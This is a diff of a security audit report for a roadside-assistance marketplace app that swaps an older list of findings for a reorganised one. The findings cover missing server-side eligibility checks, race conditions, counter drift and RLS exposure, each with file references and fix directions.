-  RETURN QUERY SELECT FALSE, 'not_in_accepted_status'::TEXT, NULL::UUID, FALSE;
-```
-The only protection for these jobs is `expire_stuck_active_requests` (3-hour cutoff, no SLA penalty on the provider). A provider can accept, advance to `en_route` in seconds, and then go dark for up to 3 hours without an `sla_failure_count` increment.
-
-**Fix direction:** Extend SLA enforcement to include `en_route` status (with a separate, longer tolerance, e.g., 45 minutes), or add a separate SLA timer for `en_route` that triggers `sla_check_and_release` if `en_route_at` is older than the threshold.
+## Medium Findings
 
 ---
 
-### M7 — `jobs_this_month` Used as `completedJobs` in Provider Scoring — Wrong Metric
+### MED-01 — Ring Eligibility and Visibility Reduction Not Enforced in Quote Submission API
 
-**File:** `src/app/api/requests/quotes/route.ts:172–181`
-**Severity:** MEDIUM
+- **Severity:** Medium
+- **File(s):** `src/lib/dispatch.ts:37–73`, `src/app/api/provider/jobs/quote/route.ts:82–101`
+- **Attack / Failure Scenario:**
+  `filterDispatchCandidates` in `dispatch.ts` enforces two rules not present in the quote API:
+  1. **PPJ ring-1 exclusion** (line 37): `if (candidate.plan === 'pay_per_job' && currentRing === 1) return false`. PPJ providers within 5 km of a request can quote freely via the API — the ring restriction is only enforced in the provider dashboard view helper.
+  2. **Visibility reduction** (line 73): `if (candidate.visibilityReduced) excluded`. A provider with `visibility_reduced = true` (3+ SLA failures) can still submit quotes via the API. The API checks `provider.status !== 'active'` (line 82) but does not read `visibility_reduced`.
 
-**Finding:**
-```typescript
-const scoreResult = computeProviderScore({
-  ...
-  completedJobs: provider.jobs_this_month ?? 0,
-  acceptanceRate: computeAcceptanceRate(provider.jobs_this_month ?? 0, (provider.jobs_this_month ?? 0) + 1),
-})
-```
-`jobs_this_month` counts accepted jobs this calendar month, not total completed jobs, and is reset to 0 by the monthly cron. New providers (on the 1st of a month) score identically regardless of their history. A provider who completed 200 jobs in 11 months scores identically to a brand-new provider on the 1st of any month.
-
-The acceptance rate computation `computeAcceptanceRate(jobs_this_month, jobs_this_month + 1)` also produces nonsensical results: a provider with `jobs_this_month = 0` has an acceptance rate of `0 / 1 = 0%`, penalizing them immediately after the monthly reset.
-
-**Fix direction:** Replace `jobs_this_month` with a total lifetime `completed_jobs` counter (add column to `providers`), or query `COUNT(*) FROM jobs WHERE provider_id = ? AND completed_at IS NOT NULL` at score time.
+  Neither the quote route nor `submit_quote_atomic` (migration 032) checks `visibility_reduced` or ring eligibility based on PPJ status.
+- **Exploitability:** Easy — any active PPJ provider can quote ring-1 requests directly. Any visibility-reduced provider can bypass their penalty by submitting quotes through the API.
+- **Production Impact:** Marketplace priority/fairness rules are not enforced at the server level. PPJ providers gain unfair access to near requests. Penalized providers (SLA failures) continue quoting without penalty.
+- **Fix Direction:** Add `visibility_reduced` check to the quote route (line 82 block): `if (provider.visibility_reduced) return 403`. For PPJ ring-1 exclusion: add distance and plan check in the route or in `submit_quote_atomic`.
 
 ---
 
-### M8 — `problem_type` Enum Missing `fuel` and `lockout` — Two Service Types Can Never Be Requested
+### MED-02 — Provider Score Uses Monthly Job Counter as Lifetime Completions
 
-**File:** `src/app/api/requests/route.ts:10`
-**Severity:** MEDIUM
+- **Severity:** Medium
+- **File(s):** `src/app/api/requests/quotes/route.ts:172–180`, `src/lib/provider-score.ts:31`
+- **Attack / Failure Scenario:**
+  The quote scoring passes `provider.jobs_this_month` as `completedJobs` to `computeProviderScore` (line 172–180). `computeProviderScore` uses `completedJobs` for the new-provider boost threshold check (`completedJobs < NEW_PROVIDER_BOOST_THRESHOLD = 10`, line 31). Since `jobs_this_month` resets monthly, a provider with 200 lifetime jobs qualifies for the new-provider rating boost (+0.5 stars) at the start of every new month, every month. The boost was intended for genuinely new providers.
 
-**Finding:**
-```typescript
-problem_type: z.enum(['flat_tire', 'battery', 'tow', 'other']),
-```
-`fair_price_config` seed data includes 6 service types: `tow`, `battery`, `flat_tire`, `fuel`, `lockout`, `other`. The request creation schema only allows 4. `fuel` and `lockout` requests can never be created by customers, making their `fair_price_config` rows unused.
-
-If the intent is to add these services, the DB is ready but the API rejects them silently as a validation error.
-
-**Fix direction:** Extend the Zod enum to include `fuel` and `lockout`, or remove the corresponding `fair_price_config` rows if the services are permanently excluded.
+  Additionally, `computeAcceptanceRate` at line 180 is called with `(provider.jobs_this_month, provider.jobs_this_month + 1)`, producing `jobs_this_month / (jobs_this_month + 1)` — always near 1.0 regardless of actual quote-to-win ratio.
+- **Exploitability:** Not an external exploit — scoring algorithm defect.
+- **Production Impact:** New-provider boost fires for experienced providers every month. Acceptance rate scoring is non-functional. Quote rankings are degraded; customers may see sub-optimal providers ranked higher than deserved.
+- **Fix Direction:** Use a lifetime completed job count (derived from `jobs` table count or a persistent counter) for `completedJobs`. Track quote submission and win counts in `provider_dispatch_log` for meaningful acceptance rate.
 
 ---
 
-## LOW FINDINGS
+### MED-03 — Customer Cancellation Counters Updated Outside RPC — Drift on Failure
+
+- **Severity:** Medium
+- **File(s):** `src/app/api/requests/cancel/route.ts:158–170`
+- **Attack / Failure Scenario:**
+  After the atomic cancellation RPC succeeds, the route performs a non-atomic counter update on the `users` table:
+  ```typescript
+  await admin.from('users').update({
+    cancellation_count: (profile.cancellation_count ?? 0) + 1,
+    late_cancellation_count: (profile.late_cancellation_count ?? 0) + (isLateCancellation ? 1 : 0),
+  }).eq('id', user.id).eq('cancellation_count', profile.cancellation_count ?? 0)
+  ```
+  If the update fails (DB error, optimistic lock failure — the `.eq('cancellation_count', ...)` guard fails when concurrent updates change the value), the error is silently swallowed (no error check after line 170 — the function proceeds to logging and returns success). The request is cancelled in the DB but the customer counter is not incremented. Late cancellations go uncounted.
+- **Exploitability:** Not actively exploitable — requires timing a race. A determined actor could attempt concurrent cancellations to keep their counter low.
+- **Production Impact:** Customer cancellation and late-cancellation counters drift downward under concurrent cancel or DB failures. Platform enforcement based on these counters becomes unreliable.
+- **Fix Direction:** Move `cancellation_count` and `late_cancellation_count` increments into `cancel_request_and_compensate_atomic` to ensure they are part of the same atomic transaction.
 
 ---
 
-### L1 — `request_id` Query Parameter in GET /api/requests/quotes Not UUID-Validated
+### MED-04 — `release_job_atomic` Resets Request to `open` Ignoring Existing Pending Quotes
 
-**File:** `src/app/api/requests/quotes/route.ts:46–49`
-**Severity:** LOW
+- **Severity:** Medium
+- **File(s):** `supabase/migrations/028_stuck_job_auto_release.sql:48–54`
+- **Attack / Failure Scenario:**
+  `release_job_atomic` (migration 028, lines 48–54) sets `status = 'open'` unconditionally. For V2 jobs, when a provider releases, other non-expired pending quotes may still exist in `request_quotes`. The `sla_check_and_release` RPC (migration 031, lines 663–670) correctly checks for pending quotes and sets status to `quoted` or `open` accordingly. `release_job_atomic` does not mirror this behavior — it always resets to `open`.
 
-**Finding:**
-```typescript
-const requestId = req.nextUrl.searchParams.get('request_id')
-if (!requestId) { return 400 }
-// no z.string().uuid() check
-```
-A non-UUID string is passed directly to `admin.from('requests').select(...).eq('id', requestId)`. Supabase uses parameterized queries (no SQL injection risk), but malformed input silently returns 404. Proper validation would return 400 with a clear message.
-
-**Fix direction:** Add `if (!requestId || !/^[0-9a-f-]{36}$/i.test(requestId)) return 400`.
+  Additionally, `release_job_atomic` does not clear `selected_quote_id` from the `requests` row. After release, the request has `status = 'open'`, `accepted_by = NULL`, but `selected_quote_id` still points to the previously selected (now-rejected or dangling) quote. Future code reading `selected_quote_id IS NOT NULL` to detect V2 requests will see a false positive on released requests.
+- **Exploitability:** Not directly exploitable.
+- **Production Impact:** Released V2 requests lose their quote context (customers must wait for providers to re-quote). Stale `selected_quote_id` creates misleading DB state. Customer UI may behave unexpectedly when re-quoting a released request.
+- **Fix Direction:** Update `release_job_atomic` to check for remaining pending non-expired quotes and set status to `quoted` or `open` accordingly. Clear `selected_quote_id = NULL` on release.
 
 ---
 
-### L2 — Daily Quote Limit Uses UTC Date Truncation, Not Rolling 24-Hour Window
+### MED-05 — Scoring Acceptance Rate Calculation Is Tautological
 
-**File:** `supabase/migrations/032_disable_range_estimator.sql:98–103`
-**Severity:** LOW
-
-**Finding:**
-```sql
-SELECT COUNT(*) INTO v_daily_count
-FROM request_quotes
-WHERE provider_id = p_provider_id
-  AND sent_at::DATE = CURRENT_DATE;
-```
-`CURRENT_DATE` in Postgres defaults to UTC. Dubai is UTC+4. At midnight UAE time, the daily limit resets 4 hours before providers expect it, allowing extra quotes from 12:00 AM–4:00 AM local time. A provider aware of this could double their effective daily limit on the UTC date boundary.
-
-**Fix direction:** Use a rolling 24-hour window: `AND sent_at > now() - INTERVAL '24 hours'`.
+- **Severity:** Medium
+- **File(s):** `src/app/api/requests/quotes/route.ts:180`, `src/lib/provider-score.ts:65–71`
+- **Attack / Failure Scenario:**
+  At line 180:
+  ```typescript
+  acceptanceRate: computeAcceptanceRate(provider.jobs_this_month ?? 0, (provider.jobs_this_month ?? 0) + 1)
+  ```
+  `computeAcceptanceRate(completed, total)` returns `completed / total` (lines 65–71). The arguments are `(jobs_this_month, jobs_this_month + 1)`, producing `jobs_this_month / (jobs_this_month + 1)`. This approaches 1.0 for any provider with >0 monthly jobs. It is identical for a provider who wins 1 in 100 quotes vs. 1 in 1 quote. The `acceptanceScore` (weighted 10% of total) is therefore uniform across all non-zero-jobs-month providers.
+- **Exploitability:** Not an external exploit.
+- **Production Impact:** Quote ranking does not penalize providers with low acceptance rates. Customers may be presented with providers who rarely complete accepted jobs.
+- **Fix Direction:** Track `total_quotes_submitted` in the providers table or compute from `provider_dispatch_log`. Use actual quote-win ratio as acceptance rate.
 
 ---
 
-### L3 — `advance_provider_job_state` RPC Allows Backward State Transitions
-
-**File:** `supabase/migrations/026_advance_state_atomic.sql:26–36`
-**Severity:** LOW
-
-**Finding:**
-Calling the RPC with `p_from_status = 'in_progress'` and `p_to_status = 'accepted'` would succeed at the DB level. No DB constraint prevents backward transitions. The route prevents this, but the RPC — the authoritative Postgres function — does not.
-
-Service-role access is required, so this is exploitable only by server-side code. The risk is minimal but real for future code paths.
-
-**Fix direction:** Add transition whitelist in RPC (see M3 fix).
+## Low Findings
 
 ---
 
-### L4 — `destination` Field Is Optional for `tow` Requests at API Level
+### LOW-01 — `advance_provider_job_state` RPC Missing `SET search_path = public`
 
-**File:** `src/app/api/requests/route.ts:21–22`
-**Severity:** LOW
-
-**Finding:**
-The `destination` field is `z.string().trim().max(300).optional().nullable()` for all request types, including `tow`. The UI requires it for tow requests, but direct API callers can omit it. Providers quoting a tow job without a destination cannot accurately price the job (no distance to destination available), leading to misleading quotes.
-
-**Fix direction:** Add server-side conditional validation: if `problem_type === 'tow'`, require `destination` to be non-null and non-empty.
-
----
-
-### L5 — `final_price` Ceiling in Completion Route Inconsistent With Quote and Price-Change Ceilings
-
-**File:** `src/app/api/provider/jobs/complete/route.ts:10`
-**Severity:** LOW
-
-**Finding:**
-```typescript
-final_price: z.number().int().min(1).max(10000),  // 10,000 AED
-// vs
-proposed_price: z.number().min(1).max(50000),     // 50,000 AED (quote)
-new_price: z.number().min(1).max(50000),           // 50,000 AED (price change)
-```
-A legitimate tow job priced at AED 12,000 (within the 50,000 quote ceiling) cannot be completed via the legacy path — `complete_provider_job_atomic` is called with `p_final_price = 12000` but the Zod schema rejects it at 400 before the RPC is reached.
-
-For V2 requests, the schema's `max(10000)` is irrelevant (RPC derives price from the quote), but it creates false constraints for providers who submit `final_price` on legacy requests.
-
-**Fix direction:** Align all price ceilings at 50,000 AED, or add a per-service-type ceiling.
+- **Severity:** Low
+- **File(s):** `supabase/migrations/026_advance_state_atomic.sql:19–20`
+- **Attack / Failure Scenario:**
+  All other security-definer RPCs in the codebase include `SET search_path = public`. `advance_provider_job_state` (migration 026) defines the function as `SECURITY DEFINER` but omits `SET search_path = public`. Without the search path pin, a malicious schema manipulation could redirect table references if the Postgres session's `search_path` is altered. In Supabase hosted environments, this is low-risk but inconsistent with the project's defensive pattern.
+- **Exploitability:** Very low.
+- **Production Impact:** Negligible in hosted Supabase. Consistency risk if search_path manipulation is ever possible.
+- **Fix Direction:** Add `SET search_path = public` to `advance_provider_job_state` in migration 039.
 
 ---
 
-### L6 — `ratings` Table Does Not Store `customer_id`
+### LOW-02 — Customer RLS on `request_quotes` Exposes Rejected and Expired Quotes Including Provider UUIDs
 
-**File:** `supabase/migrations/001_initial_schema.sql:57–64`
-**Severity:** LOW
+- **Severity:** Low
+- **File(s):** `supabase/migrations/031_marketplace_v2_schema.sql:93–106`
+- **Attack / Failure Scenario:**
+  The RLS policy "Customer reads quotes on own requests" (lines 93–106) has no status filter — a customer using the Supabase JS client directly can SELECT `rejected` and `expired` quotes including `provider_id` columns. The API route (`GET /api/requests/quotes`) filters to `status = 'pending'` before returning data, so the customer UI never shows stale quotes. But a customer making direct Supabase client calls can enumerate all historical provider UUIDs who quoted their requests, including those who were rejected.
 
-**Finding:**
-```sql
-CREATE TABLE ratings (
-  id UUID PRIMARY KEY,
-  job_id UUID UNIQUE,
-  provider_id UUID,
-  stars INTEGER,
-  comment TEXT,
-  created_at TIMESTAMPTZ
-);
--- no customer_id column
-```
-Rating comments cannot be traced back to their author. If a provider disputes an abusive or false comment, admins have no direct way to identify the customer. The comment accountability gap could shield coordinated rating manipulation.
-
-**Fix direction:** Add `customer_id UUID REFERENCES users(id)` to the `ratings` table in migration 039.
+  Combined with Part 1 finding L3 (provider anonymous ID is first 4 chars of UUID), this allows a customer to trivially de-anonymize providers from rejected quotes.
+- **Exploitability:** Low — requires direct Supabase client use with the anon key + session.
+- **Production Impact:** Provider identity (UUID) leaks for rejected/expired quotes. Undermines the anonymity model before quote selection.
+- **Fix Direction:** Add `AND status = 'pending'` to the customer RLS SELECT policy on `request_quotes`, or serve quotes exclusively through the authenticated API route.
 
 ---
 
-### L7 — Rating Duplicate INSERT Returns 500 Instead of 409 on Concurrent Submissions
+### LOW-03 — `expire_stuck_active_requests` Does Not Decrement `jobs_this_month`
 
-**File:** `src/app/api/ratings/route.ts:67–75`
-**Severity:** LOW
-
-**Finding:**
-The route pre-checks for an existing rating:
-```typescript
-const { data: existing } = await admin.from('ratings').select('id').eq('job_id', ...).maybeSingle()
-if (existing) { return 409 }
-```
-Two concurrent rating requests both pass this check (`existing = null`). The first INSERT succeeds. The second INSERT fails on the `UNIQUE(job_id)` DB constraint, returning a 500 error to the client instead of 409.
-
-**Fix direction:** Catch the unique-constraint error code (`23505`) in the insert error and return 409.
+- **Severity:** Low
+- **File(s):** `supabase/migrations/028_stuck_job_auto_release.sql:88–145`
+- **Attack / Failure Scenario:**
+  The weekly `expire_stuck_active_requests` cron RPC (lines 88–145) releases stuck `accepted`/`en_route`/`arrived` requests. It increments `release_count` and `provider_side_cancellation_count` but does not decrement `jobs_this_month`. Providers whose stuck jobs are weekly-auto-released lose their monthly job slot permanently for that month, even if they did not complete a job.
+- **Exploitability:** Not exploitable.
+- **Production Impact:** Same nature as HIGH-03 but lower frequency (weekly cron). Compounds counter drift over time.
+- **Fix Direction:** Add `jobs_this_month = GREATEST(0, COALESCE(jobs_this_month, 0) - 1)` to the provider update in `expire_stuck_active_requests`.
 
 ---
 
-### L8 — SLA Cron Processes Up to 50 Breached Requests Serially, Approaching Timeout
+### LOW-04 — `advance_provider_job_state` RPC Does Not Whitelist Valid `p_to_status` Values
 
-**File:** `src/app/api/ops/marketplace-cron/route.ts:132–152`
-**Severity:** LOW
+- **Severity:** Low
+- **File(s):** `supabase/migrations/026_advance_state_atomic.sql:25–52`
+- **Attack / Failure Scenario:**
+  The RPC accepts `p_to_status TEXT` without validating it against the allowed set of status values. The route-level `VALID_TRANSITIONS` map in `advance-state/route.ts:8–12` provides the whitelist at the API layer. The DB `requests_status_check` constraint (migration 031 line 17) is the final backstop. The RPC itself has no internal whitelist.
 
-**Finding:**
-`enforceSla` fetches up to 50 breached requests and calls `sla_check_and_release` in a serial `for` loop. Each RPC call takes ~20–100 ms. At 50 requests × 100 ms, this part alone could take 5 seconds. Combined with `expireStaleQuotes` and `expireUnselectedRequests` running in parallel (via `Promise.all`), the total cron execution time could approach the `maxDuration = 30` limit under load.
-
-At production scale with many concurrent accepted jobs breaching SLA simultaneously, the cron could time out before processing all 50 requests.
-
-**Fix direction:** Process SLA releases in parallel (`Promise.all`) rather than a serial loop, or increase the `limit` query and add a dedicated higher-timeout route.
-
----
-
-### L9 — `price_change_requested` Stored as NUMERIC(10,2) but Cast to INTEGER at Completion
-
-**File:** `supabase/migrations/031_marketplace_v2_schema.sql:773`
-**Severity:** LOW
-
-**Finding:**
-```sql
-v_derived_price := v_request.price_change_requested::INTEGER;
-```
-A price change of AED 150.75 is stored in `price_change_requested NUMERIC(10,2)` but truncated to AED 150 at completion. The customer approved 150.75 AED; the final price is 150 AED. Minor but creates a discrepancy between the approval and the receipt.
-
-**Fix direction:** Use `ROUND(v_request.price_change_requested)::INTEGER` for predictable rounding behavior, or change `v_derived_price` to `NUMERIC(10,2)` throughout the completion RPC.
+  If the RPC were called directly with service_role access (e.g., from a future internal tool or a misuse of the admin SDK), any string could be attempted (constrained only by the DB CHECK).
+- **Exploitability:** Very low — requires service_role access.
+- **Production Impact:** None in current implementation. The DB constraint provides the backstop. Defense-in-depth concern.
+- **Fix Direction:** Add a CASE/IF whitelist validation inside the RPC for `p_to_status` values.
 
 ---
 
-### L10 — `provider_dispatch_log` Has No Retention Policy — Unbounded Growth
+### LOW-05 — Marketplace Cron SLA Enforcement Processes at Most 50 Requests Per Run
 
-**File:** `supabase/migrations/031_marketplace_v2_schema.sql:124–164`
-**Severity:** LOW
-
-**Finding:**
-Every quote submission, selection, SLA failure, and completion writes a row to `provider_dispatch_log`. At 100 providers × 10 quotes/day, this is 1,000 rows/day, 365,000 rows/year, growing without bound. No archival or delete policy exists.
-
-**Fix direction:** Add a cron job to archive rows older than 90 days to a `provider_dispatch_log_archive` table, or add a `created_at < now() - INTERVAL '90 days'` delete in the monthly ops cron.
-
----
-
-### L11 — `NEXT_PUBLIC_SOFT_LAUNCH_MODE` Requires Redeploy to Change
-
-**File:** `src/types/index.ts`
-**Severity:** LOW
-
-**Finding:**
-```typescript
-export const SOFT_LAUNCH_MODE = process.env.NEXT_PUBLIC_SOFT_LAUNCH_MODE === 'true'
-```
-`NEXT_PUBLIC_*` variables are baked into the client bundle at build time. Disabling soft launch mode requires a full Vercel redeploy, not a simple env variable update. This increases the time-to-switch when moving from soft launch to production billing.
-
-**Fix direction:** Evaluate `SOFT_LAUNCH_MODE` from a server-side env var (`SOFT_LAUNCH_MODE` without `NEXT_PUBLIC_`) in API routes, keeping the client-side flag for UI behavior only.
+- **Severity:** Low
+- **File(s):** `src/app/api/ops/marketplace-cron/route.ts:121`
+- **Attack / Failure Scenario:**
+  `enforceSla` queries breached requests with `.limit(50)` (line 121). If more than 50 SLA breaches accumulate between cron runs (e.g., after a cron outage or spike in activity), only 50 are processed per run. The remainder accumulate.
+- **Exploitability:** Not exploitable — occurs under cron failure or high volume.
+- **Production Impact:** SLA enforcement backlog during incidents. Penalized providers escape consequences temporarily. Customers remain locked longer.
+- **Fix Direction:** Paginate or remove the limit. Add monitoring to alert when the batch is full (count >= 50).
 
 ---
 
-## SUMMARY TABLE
+### LOW-06 — Migration Files 033 and 034 Contain Duplicate Function Bodies
 
-| ID | Title | Severity | File(s) |
-|----|-------|----------|---------|
-| H1 | Ring/dispatch eligibility not enforced at quote submission API | **HIGH** | `api/provider/jobs/quote/route.ts`, `lib/dispatch.ts` |
-| H2 | `release_job_atomic` does not clear `selected_quote_id` — stale FK sets wrong price | **HIGH** | `migrations/028:48–55`, `migrations/031:773–780` |
-| H3 | `release_job_atomic` and `expire_stuck_active_requests` do not decrement `jobs_this_month` | **HIGH** | `migrations/028:74–77, 130–133` |
-| H4 | Provider auto-suspended by 5 coordinated low ratings — no admin review gate | **HIGH** | `migrations/001:189–200` |
-| H5 | Price change route returns 200 on zero-row UPDATE after job completion race | **HIGH** | `api/provider/jobs/price-change/route.ts:69–88` |
-| H6 | Stored XSS in user-supplied text fields rendered in admin/provider UIs | **HIGH** | `api/requests/route.ts:13,22`, `api/ratings/route.ts:11`, `api/admin/providers/update/route.ts:21` |
-| M1 | Cron expires requests and quotes in parallel, not atomically | **MEDIUM** | `api/ops/marketplace-cron/route.ts:24–38` |
-| M2 | Price change count check-then-increment is not atomic | **MEDIUM** | `api/provider/jobs/price-change/route.ts:65–75` |
-| M3 | `advance_provider_job_state` RPC accepts arbitrary `p_to_status` | **MEDIUM** | `migrations/026:26–36` |
-| M4 | Late cancellation does not clear `accepted_by` / `selected_quote_id` | **MEDIUM** | `migrations/034:52–60` |
-| M5 | `cancellation_count` counter update silently fails on concurrent race | **MEDIUM** | `api/requests/cancel/route.ts:163–170` |
-| M6 | SLA cron targets only `accepted` — `en_route`/`arrived` jobs avoid 20-min penalty | **MEDIUM** | `api/ops/marketplace-cron/route.ts:114–120` |
-| M7 | `jobs_this_month` used as `completedJobs` in scoring — wrong metric, resets monthly | **MEDIUM** | `api/requests/quotes/route.ts:172–181` |
-| M8 | `problem_type` enum missing `fuel` and `lockout` service types | **MEDIUM** | `api/requests/route.ts:10` |
-| L1 | `request_id` query param in GET /api/requests/quotes not UUID-validated | **LOW** | `api/requests/quotes/route.ts:46–49` |
-| L2 | Daily quote limit uses UTC date truncation, not rolling 24-hour window | **LOW** | `migrations/032:98–103` |
-| L3 | RPC allows backward state transitions (service_role only) | **LOW** | `migrations/026:26–36` |
-| L4 | `destination` optional for `tow` requests at API level | **LOW** | `api/requests/route.ts:21–22` |
-| L5 | `final_price` ceiling (10,000) inconsistent with quote/price-change ceiling (50,000) | **LOW** | `api/provider/jobs/complete/route.ts:10` |
-| L6 | `ratings` table lacks `customer_id` — no comment accountability | **LOW** | `migrations/001:57–64` |
-| L7 | Rating duplicate INSERT returns 500 instead of 409 | **LOW** | `api/ratings/route.ts:67–75` |
-| L8 | SLA cron processes 50 breached requests serially, near 30-second timeout | **LOW** | `api/ops/marketplace-cron/route.ts:132–152` |
-| L9 | `price_change_requested` NUMERIC truncated to INTEGER at completion | **LOW** | `migrations/031:773` |
-| L10 | `provider_dispatch_log` has no retention policy | **LOW** | `migrations/031:124–164` |
-| L11 | `SOFT_LAUNCH_MODE` requires full redeploy to change | **LOW** | `src/types/index.ts` |
+- **Severity:** Low
+- **File(s):** `supabase/migrations/033_nearby_requests_include_quoted.sql`, `supabase/migrations/034_cancel_allow_quoted_status.sql`
+- **Attack / Failure Scenario:**
+  Both migration files contain the same function defined twice within the same file (observed during read — each file defines the same `CREATE OR REPLACE FUNCTION` body twice). On idempotent re-run this is safe (the second definition overwrites the first), but it indicates a copy-paste error in the migration files. Future developers reading these migrations may be confused about which definition is authoritative, and text-based diff tools will show duplicate content.
+- **Exploitability:** None.
+- **Production Impact:** No functional impact. Code maintenance/clarity concern.
+- **Fix Direction:** Remove duplicate function bodies from both migration files (documentation-only fix; do not modify deployed migrations, note for migration 039 comments).
 
 ---
 
-## DATA INTEGRITY RISKS AT SCALE
+## Needs Verification
 
-The following patterns create silent counter drift and data inconsistency that compounds at production volume. None of these are immediately exploitable but will degrade platform reliability over months.
+### NV-01 — Auto-Suspension Trigger May Be Vulnerable to Coordinated Fake Rating Campaign
 
----
+- **Context:** The `check_provider_suspension` trigger (migration 001, lines 189–201) auto-suspends a provider when `rating < 3.0` after 5+ ratings. The rating route requires a completed job owned by the submitting customer. A coordinated campaign of real customers submitting 1-star ratings across 5 different completed jobs could trigger auto-suspension without recourse. There is no rate-limit on the number of distinct customers who can rate a provider in a given time window.
+- **What Needs Verification:** Whether any abuse detection (e.g., manual review queue for auto-suspensions, minimum time between ratings per customer-provider pair) is configured outside the source code.
 
-**SCALE-1: `jobs_this_month` counter diverges from reality under high job turnover**
+### NV-02 — `SOFT_LAUNCH_MODE` in Production
 
-At production, a provider completing 15 jobs/month with 2–3 releases (manual or SLA) will have `jobs_this_month` overstated by 2–3. Over multiple months this resets, but within a month:
-- Legacy accept path rate-limiting becomes incorrect
-- Provider scoring in the quote ranking is inflated
-- Monthly allowance accounting is wrong
+- **Context:** `SOFT_LAUNCH_MODE` is passed to `submit_quote_atomic` as `p_is_soft_launch` but only affects the dispatch log (migration 032). If `SOFT_LAUNCH_MODE = true` in production, the intended behavior (PPJ fee = 0, no Stripe capture) suppresses real charges. The source cannot confirm the production env var value.
+- **What Needs Verification:** Confirm `NEXT_PUBLIC_SOFT_LAUNCH_MODE = false` in Vercel production environment before enabling real payments.
 
-The counter is mutated by at least 6 separate code paths (4 increment, 4 decrement), and not all paths are symmetric (H3 above). A reconciliation cron or a view-based derivation from actual `requests` counts would be more reliable.
+### NV-03 — Provider Ratings Trigger Table Scan on Each Insert
 
----
-
-**SCALE-2: `update_provider_rating` trigger creates write hot-spot on `providers` table**
-
-Every rating INSERT triggers an aggregate query over the last 50 rows of `ratings` for that provider, then an UPDATE on `providers.rating`. Under concurrent ratings (e.g., a popular provider completing many jobs in a short window), this creates a write hot-spot on the `providers` row, serializing all rating-write transactions for that provider. At scale, this increases P99 latency for the ratings API.
-
-The cascading trigger on `providers.rating` (`check_provider_suspension`) then further locks the providers row. Two chained triggers per rating INSERT is expensive.
+- **Context:** `update_provider_rating` (migration 001, lines 170–183) and `check_provider_suspension` (lines 189–201) fire on every rating insert. `check_provider_suspension` does `SELECT COUNT(*) FROM ratings WHERE provider_id = NEW.id` — a potentially full table scan if no index exists on `ratings(provider_id)`. Migration 001 does not create this index. At scale with many ratings, this could be slow.
+- **What Needs Verification:** Check whether a later migration adds `CREATE INDEX ON ratings(provider_id)`.
 
 ---
 
-**SCALE-3: `request_quotes` table contains multi-status orphans from non-atomic release paths**
+## Business Decisions
 
-After `release_job_atomic`, the request goes to `open` but:
-- The previously `selected` quote row remains `selected` indefinitely (not rejected)
-- The previously `rejected` quotes from competitors remain `rejected`
+### BD-01 — PPJ Providers Excluded From Ring 1 Is a Business Rule Enforced Only in Dashboard
 
-If the request is re-quoted by new providers, the `request_quotes` table accumulates multiple generations of quotes for the same `request_id`: old `selected`/`rejected` rows mixed with new `pending` rows. The `UNIQUE(request_id, provider_id)` constraint means a provider who previously quoted this request (and was rejected) cannot re-quote it after the job is released, even though their previous quote was made under a different competitive context.
+The dispatch.ts ring-1 exclusion for PPJ providers is a business model decision. Whether it should be enforced at the API level (quote submission) is a product decision. See MED-01 for the implementation gap.
 
----
+### BD-02 — One Price Change Per Job Is Business Policy
 
-**SCALE-4: `provider_dispatch_log` is append-only with no foreign key constraints on soft-deleted data**
+The limit of one price change per job (`price_change_count >= 1`) is an intentional business rule. The implementation has a race condition (CRIT-01) that violates the rule, but the rule itself is not in question.
 
-`provider_dispatch_log` has `ON DELETE CASCADE` on both `provider_id` and `request_id`. If a provider or request is deleted, all associated dispatch logs are silently purged. At audit time, historical dispatch data needed for fraud investigation or SLA disputes would be unrecoverable.
+### BD-03 — Commission at Zero for Current Phase
 
----
+Commission hardcoded to zero in `complete_provider_job_atomic` (migration 031, lines 795–796) is a deliberate soft-launch phase decision. Noted as M5 in Part 1; not re-investigated here.
 
-**SCALE-5: Monthly allowance reset cron failure cascades to incorrect overage billing**
+### BD-04 — Legacy Accept Endpoint Coexistence
 
-`/api/ops/monthly-allowance-reset` resets `jobs_this_month = 0` for all providers. If this cron fails (network error, Vercel timeout, Upstash unavailable), providers carry their previous month's count into the new month. This causes:
-- Subscription providers to hit their monthly limit on day 1
-- Legacy accept path to block new jobs until manual admin intervention
-- V2 quote path to remain unaffected (H3 from Part 1)
-
-There is no alerting on cron failure, no reconciliation check, and no idempotent retry mechanism. A missed monthly reset effectively breaks the billing model for all subscription providers until the next successful cron run.
+The legacy `/api/provider/requests/accept` endpoint remaining active alongside V2 is a known business decision. Noted as HIGH-02 in Part 1.
 
 ---
 
-**SCALE-6: `fair_price_config` is read-writable by any authenticated user in UI but only via admin API**
+## Data Integrity Risks at Scale
 
-The `fair_price_config` table has `AUTHENTICATED READ` RLS policy, so any logged-in user can read all service price configurations. There is no server-side API to write to this table — only an admin RLS policy exists. However, if the admin panel ever adds a UI to update these rows, the lack of audit logging on `fair_price_config` changes would prevent detection of price-range manipulation.
+1. **`jobs_this_month` drift (upward):** Incremented by `select_quote_atomic` (V2 acceptance). Decremented by `cancel_request_and_compensate_atomic` (customer cancel) and `sla_check_and_release` (SLA breach, accepted-only). NOT decremented by `release_job_atomic` (provider release) or `expire_stuck_active_requests` (weekly cron release). Net drift: every provider release and every weekly auto-release permanently inflates the counter within the month.
+
+2. **`cancellation_count` / `late_cancellation_count` drift (downward):** Updated outside the atomic cancellation RPC. Silent failure under DB error or optimistic lock collision results in under-counting. Platform enforcement based on these counters degrades over time.
+
+3. **`sla_failure_count` / `visibility_reduced` under-counting:** `sla_failure_count` is only incremented by `sla_check_and_release`, which only processes `accepted` status. Providers who advance to `en_route` before abandoning jobs never have their SLA failures counted. The `visibility_reduced` flag is therefore never triggered for this class of bad actor.
+
+4. **`price_change_count` invariant violation:** Under concurrent requests, `price_change_count` can exceed 1 (CRIT-01). The "maximum one price change per job" invariant is not enforced atomically.
+
+5. **`selected_quote_id` stale FK after `release_job_atomic`:** After a provider-initiated release, `requests.selected_quote_id` retains the old quote UUID while `accepted_by = NULL`. This FK points to a quote row in `rejected` or `selected` status. Future queries using `selected_quote_id IS NOT NULL` to detect V2 requests return false positives for released requests.
+
+6. **Duplicate migration function definitions:** Migrations 033 and 034 each define their respective functions twice in the same file. Safe on re-run (CREATE OR REPLACE), but creates maintenance confusion.
 
 ---
 
-*End of Security Audit Part 2. No source files were modified. All findings are for review only.*
+## Summary Table
+
+| ID | Severity | Title | File |
+|----|----------|-------|------|
+| CRIT-01 | Critical | Price-change count is TOCTOU read-then-write; race allows two price changes and resetting a customer's reject | `provider/jobs/price-change/route.ts:44–74` |
